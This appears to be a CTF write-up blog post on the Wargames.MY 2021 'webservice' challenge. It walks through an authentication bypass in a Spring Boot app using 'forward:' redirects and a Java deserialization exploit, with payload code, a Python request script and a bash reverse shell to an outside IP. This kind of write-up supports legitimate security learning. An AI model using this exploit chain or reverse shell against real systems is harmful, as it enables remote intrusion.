---
layout: post
title: webservice (web)
ctf: Wargames.MY 2021
permalink: /wargamesmy-21/webservice
---

I can't remember the name of the challenge but this should be it. There are 2 flags for this challenge.

We were given a web service running on Java, and provided with the [jar file][challenge] for this service.

The main page looks like this:

![list][list]

**RedirectorWS** looks like this:

![redirect][redirect]

This message smells like there could be a SSRF vulnerability (more on this later).

And the other 2 options just bring me to a login page:

![login][login]

So, it seems like the first step is to gain access to content that requires login. Once I can do that, I can get the flag through **GetFlagWS**.

### Code

To know exactly what this web app does, I need to look at the code. So, I opened the jar file in JD-GUI.

First of all, I see that this web app runs on top of the Spring Boot framework, because of the package name there.

![packages][packages]

Moving on, I expanded the `BOOT-INF` package and found the classes that seem related to the web app's functionality.

![wargames][wargames]

* `BackendController.class`
* `HelloController.class`
* `Helper.class`
* `SpringbootApplication.class`
* `WargamesMsg.class`
* `WebSecurityConfig.class`
* `WsController.class`

#### Security

The first thing that seemed interesting to me was `WebSecurityConfig.class`. I wanted to see if there are any default passwords.

```java
@Configuration
@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  @Autowired
  public void globalSecurityConfiguration(AuthenticationManagerBuilder auth) throws Exception {}

  protected void configure(HttpSecurity http) throws Exception {
    ((HttpSecurity)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http
      .authorizeRequests()
      .antMatchers(new String[] { "/", "/webjars/**", "/ws/unprotected/**" })).permitAll()
      .anyRequest()).authenticated()
      .and())
      .formLogin().and())
      .httpBasic();
  }

  public void configure(WebSecurity web) throws Exception {
    web.ignoring().antMatchers(HttpMethod.POST, new String[] { "/ws/unprotected/**" });
  }
}
```

From here, I see that `/`, `/webjars/**` and `/ws/unprotected/**` don't need authentication (the **RedirectorWS** page from earlier is at `/ws/unprotected/redirector`).

```java
      .antMatchers(new String[] { "/", "/webjars/**", "/ws/unprotected/**" })).permitAll()
```

Any other endpoints probably need Basic Authentication through a login form.

```java
      .anyRequest()).authenticated()
      .and())
      .formLogin().and())
      .httpBasic();
```

But there are no default passwords here. I also checked **application.properties** and found no passwords there.

Then, I wondered if Spring Boot has any default password at the start. But it turns out that for each instance, there will be a randomly generated password at the start. The password will be shown in the logs, and looks like this:

```
Using generated security password: 9bc623f8-c113-4823-8de6-8fe364be4c0e
```

#### Controller

Moving on, I looked at `WsController.class`.

```java
@Controller
@RequestMapping({"/ws"})
public class WsController {
  @RequestMapping(value = {"/unprotected/redirector"}, method = {RequestMethod.GET, RequestMethod.POST})
  public String redirector(@RequestParam(name = "url", required = false, defaultValue = "none") String url, Model model) {
    if (url.equalsIgnoreCase("none")) {
      model.addAttribute("error", "'url' parameter is missing!");
      return "error";
    }
    if (url.startsWith("http://") || url.startsWith("https://"))
      return "redirect:" + url;
    return url;
  }

  @GetMapping({"/getflag"})
  public String getflag(Model model) {
    model.addAttribute("flag", "###REMOVED FOR DISTRIBUTION###");
    return "flag";
  }

  @GetMapping({"/object"})
  public String getObject(Model m) {
    m.addAttribute("error", "How to invoke: <br/><pre>POST /ws/object HTTP/1.1<br />Content-length: 123<br/>....<br/><br/>##JAVA Object##</pre>");
    return "error";
  }

  @PostMapping({"/object"})
  public void postObject(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    ValidatingObjectInputStream is = new ValidatingObjectInputStream((InputStream)req.getInputStream());
    try {
      Class<?>[] classTypes = new Class[2];
      classTypes[0] = Class.forName("my.wargames.springboot.WargamesMsg");
      classTypes[1] = Class.forName("[B");
      is.accept(classTypes);
      WargamesMsg orly = (WargamesMsg)is.readObject();
      orly.rekt();
    } catch (IOException ex) {
      ex.printStackTrace();
      System.out.println("(-) IOException is caught");
    } catch (ClassNotFoundException ex) {
      ex.printStackTrace();
      System.out.println("(-) ClassNotFoundException is caught");
    } catch (Exception e) {
      e.printStackTrace();
      System.out.println("(-) IOException is caught");
    }
    resp.setContentType("text/plain");
    resp.getWriter().write(":)");
  }
}
```

I see that each endpoint has their own function(s).

* **RedirectorWS** (`/ws/unprotected/redirector`) => `redirector`
* **GetflagWS** (`/getflag`) => `getflag`
* **ObjectWS** (`/object`) => `getObject` (GET request) and `postObject` (POST request)


#### Redirector

Since **RedirectorWS** is the only endpoint I can access now, I need to see if there's a vulnerability in this function.

```java
  @RequestMapping(value = {"/unprotected/redirector"}, method = {RequestMethod.GET, RequestMethod.POST})
  public String redirector(@RequestParam(name = "url", required = false, defaultValue = "none") String url, Model model) {
    if (url.equalsIgnoreCase("none")) {
      model.addAttribute("error", "'url' parameter is missing!");
      return "error";
    }
    if (url.startsWith("http://") || url.startsWith("https://"))
      return "redirect:" + url;
    return url;
  }
```

This endpoint takes a parameter `url`, and then redirects the page to it. Usually when a service does some redirecting based on a user-supplied URL, there is a risk of SSRF. An attacker can provide a malicious URL that makes the service access some internal resources.

Anyways, firstly, what this function does is
- for URLs starting with `http://` or `https://`, return `"redirect:"+url`
- otherwise, return `url`

I had to find out what `return` does in Spring Boot controllers. It turns out that the return value is used to choose the HTML file in the **templates** folder, which the user will be redirected to.

```plaintext
- templates
|-- debug.html
|-- error.html
|-- flag.html
|-- greeting.html
|-- index.html
```

I tried the simple idea, visit `/ws/unprotected/redirector?url=flag` and hope to get the flag. But nope, it doesn't work, I was brought to the login page instead. Then, I also tried giving `url=redirect:flag`. Also doesn't work.

#### Failed SSTI attempts

Since the obvious ideas didn't work for me, I thought maybe there's some other vulnerability. Here's something I tested but wasn't vulnerable.

I wondered if there's any possible SSTI, because of the use of templates. In particular, `debug.html` and `error.html` as seen below.

```html
<!DOCTYPE HTML>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Debug</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <link th:rel="stylesheet" th:href="@{/webjars/bootstrap/4.5.0/css/bootstrap.min.css}" />
</head>
<body>
    <p th:text="'Hello, ' + ${name} + '!'" />
</body>
</html>
```

```html
<body>
	<main role="main" class="container">
	  <div class="starter-template">
	    <h1>Error</h1>
	    <p class="lead">
	    	<p th:utext="${error}" />
	    </p>
	  </div>
	</main>
    <script type='text/javascript' src='/webjars/jquery/jquery.min.js'></script>
    <script type='text/javascript' src='/webjars/bootstrap/js/bootstrap.min.js'></script>
	</body>
</html>
```

I can set `url=debug` or `url=error` so that I am redirected to one of these pages. I thought maybe if I can pass the `name` or `error` parameter above, there is a chance for SSTI, but idk. Here's an example of how it can be done, through `model.addAttribute`:

```java
    if (url.equalsIgnoreCase("none")) {
      model.addAttribute("error", "'url' parameter is missing!");
      return "error";
    }
```

But I can't call `model.addAttribute` by myself, so I had to find another way. I only control the returned string, that's all. After some tries on searching through Google, I don't find any way to pass the parameters without using this method. So nvm.

#### Moving forward

SSTI didn't work. I am now curious, the `redirect:` looks interesting, so I decided to read about it.

According to [this guide](https://www.baeldung.com/spring-redirect-and-forward), this is what `redirect:` does (and another thing called `forward:`):

> Before the code, let's go over a quick, high-level overview of the semantics of forward vs. redirect:
>
> * `redirect` will respond with a 302 and the new URL in the Location header; the browser/client will then make another request to the new URL
> * `forward` happens entirely on a server side; the Servlet container forwards the same request to the target URL; the URL won't change in the browser

This `forward:` thing looks intersting, especially the part where "**`forward` happens entirely on a server side**" and "**the URL won't change in the browser**". I don't know what a Servlet is but nvm. The important thing is that I'm not just redirected to the URL I choose.

I tried setting `url=forward:/ws/getflag` and ooh ok I got the flag.

So, it indeed was a SSRF. Because it is the server that visits `/ws/getflag` and not me, it does not check whether I am authenticated, and happily retrieves the contents of `/ws/getflag` for me. Similarly, I can also use this vulnerability to access **ObjectWS** at `/ws/object`, which is part 2 of this challenge.

### Deserialization Attack

For this part, we were told to get RCE. The `getObject` function looks exactly like a surface for RCE.

```java
  @GetMapping({"/object"})
  public String getObject(Model m) {
    m.addAttribute("error", "How to invoke: <br/><pre>POST /ws/object HTTP/1.1<br />Content-length: 123<br/>....<br/><br/>##JAVA Object##</pre>");
    return "error";
  }

  @PostMapping({"/object"})
  public void postObject(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    ValidatingObjectInputStream is = new ValidatingObjectInputStream((InputStream)req.getInputStream());
    try {
      Class<?>[] classTypes = new Class[2];
      classTypes[0] = Class.forName("my.wargames.springboot.WargamesMsg");
      classTypes[1] = Class.forName("[B");
      is.accept(classTypes);
      WargamesMsg orly = (WargamesMsg)is.readObject();
      orly.rekt();
    } catch (IOException ex) {
      ex.printStackTrace();
      System.out.println("(-) IOException is caught");
    } catch (ClassNotFoundException ex) {
      ex.printStackTrace();
      System.out.println("(-) ClassNotFoundException is caught");
    } catch (Exception e) {
      e.printStackTrace();
      System.out.println("(-) IOException is caught");
    }
    resp.setContentType("text/plain");
    resp.getWriter().write(":)");
  }
```

It reads from the input stream (which is the data of a POST request), then treats it as a `WargamesMsg` object, then calls its `rekt` method.

In `WargamesMsg.class`, this is what `rekt` does:

```java
  private String data = null;

  private String className = null;

  private String methodName = null;

  public void rekt() throws Exception {
    try {
      Class<?> cl = Class.forName(this.className);
      Method method = cl.getMethod(this.methodName, new Class[] { String.class });
      method.invoke(null, new Object[] { this.data });
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
```

This is Java code that people usually don't write, so here's the summary line by line:

1. `Class<?> cl = Class.forName(this.className);`
   1. Based on the `className` `String` field of this object, and gets the class with this name
2. `Method method = cl.getMethod(this.methodName, new Class[] { String.class });`
   1. Based on the `methodName` `String` field of this object, and gets the method with this name, in this class
3. `method.invoke(null, new Object[] { this.data });`
   1. Calls the method, with the `data` `String` field as the argument.
   2. In other words, calls `<className>.<methodName>(data)`

Not so complicated now :D

Now, to summarize what we have and know:

1. We can send a Java object through a POST request to `/ws/object`.
2. The object must be of the `WargamesMsg` class.
3. The `rekt` method of the object is called, which will, based on the `className`, `methodName`, `data` fields, call `<className>.<methodName>(data)`.

In order words, I just have to send a `WargamesMsg` object with the `className`, `methodName` and `data` set to some useful values, to gain RCE.

I found this code online that will serialize an object, then save the serialized bytes to a file:

```java
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.nio.file.Files;

import my.wargames.springboot.WargamesMsg;

public class Main {

    public static void main(String args[]) {
        WargamesMsg msg = new WargamesMsg();

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = null;
        try {
            out = new ObjectOutputStream(bos);
            out.writeObject(msg);
            out.flush();

            byte[] msgBytes = bos.toByteArray();
            try (FileOutputStream fos = new FileOutputStream("payload.bin")) {
                fos.write(msgBytes);
            }
        } catch (IOException ex) {
        }
    }
}
```

With this, I can make a `WargamesMsg` class that looks exactly like the one in the web app. Importantly, the function expects this class name:

```java
      classTypes[0] = Class.forName("my.wargames.springboot.WargamesMsg");
```

So, other than needing the class name to be `WargamesMsg`, it also needs to be in the package `my.wargames.springboot`. In order to do so, I need to put **WargamesMsg.java** in the **my/wargames/springboot** folder.

```plaintext
|- Main.java
|- my
  |- wargames
    |- springboot
      |- WargamesMsg.class
```


In the app, there's also this `Helper.class`:

```java
class Helper {
  private String name = "helper";

  public void setName(String name) {
    this.name = name;
  }

  public String getName() {
    return this.name;
  }

  public static void execOwnCommand(String command) throws Exception {
    String[] cmd = { "/bin/bash", "-c", command };
    Runtime r = Runtime.getRuntime();
    r.exec(cmd);
  }
}
```

So ok, thanks, I just need to call `my.wargames.springboot.Helper.execOwnCommand(<REVERSE_SHELL>)` to get a reverse shell. i.e.

* `className`: `my.wargames.springboot.Helper`
* `methodName`: `execOwnCommand`
* `data`: `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`

Here's how my `WargamesMsg` looks like:

```java
package my.wargames.springboot;

import java.io.Serializable;

public class WargamesMsg implements Serializable {
    private static final long serialVersionUID = 1234567L;

    private String data = "bash -i >& /dev/tcp/128.199.135.239/8888 0>&1";

    private String className = "my.wargames.springboot.Helper";

    private String methodName = "execOwnCommand";

    public WargamesMsg() {
    }

    public void rekt() {
    }

    public int hashCode() {
        return 4919;
    }
}
```

Finally, build and run the program to get my payload object.

```
javac Main.java my/wargames/springboot/WargamesMsg.java
java Main
```

And send it to the service.

```py
import requests

r = requests.post("http://wgmyws.wargames.my:50002/ws/unprotected/redirector?url=forward:/ws/object", data=open("payload.bin", "rb").read())
# r = requests.post("http://localhost:9191/ws/unprotected/redirector?url=forward:/ws/object", data=open("payload.bin", "rb").read())

print(r.text)

# wgmy{30a4c532348450e39330c663d93b702e}
```




[challenge]:{{site.baseurl}}/ctfs/wargamesmy-21/webservice/WGMYWS-1.0.0-DIST/WGMYWS-1.0.0-DIST.jar
[list]:{{site.baseurl}}/ctfs/wargamesmy-21/webservice/list.png
[packages]:{{site.baseurl}}/ctfs/wargamesmy-21/webservice/packages.png
[login]:{{site.baseurl}}/ctfs/wargamesmy-21/webservice/login.png
[redirect]:{{site.baseurl}}/ctfs/wargamesmy-21/webservice/redirect.png
[wargames]:{{site.baseurl}}/ctfs/wargamesmy-21/webservice/wargames.png